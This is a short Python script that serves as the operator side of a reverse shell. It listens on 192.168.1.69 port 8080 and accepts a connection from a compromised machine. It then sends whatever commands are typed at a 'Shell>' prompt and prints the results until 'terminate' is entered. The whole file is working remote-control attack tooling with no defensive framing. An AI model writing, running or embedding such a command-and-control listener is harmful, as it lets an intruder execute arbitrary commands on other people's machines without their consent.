import socket


def connect():
    s = socket.socket()
    s.bind(("192.168.1.69",8080))
    s.listen(1)
    conn, addr = s.accept()
    print('[+] we got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


def main():
    connect()


main()
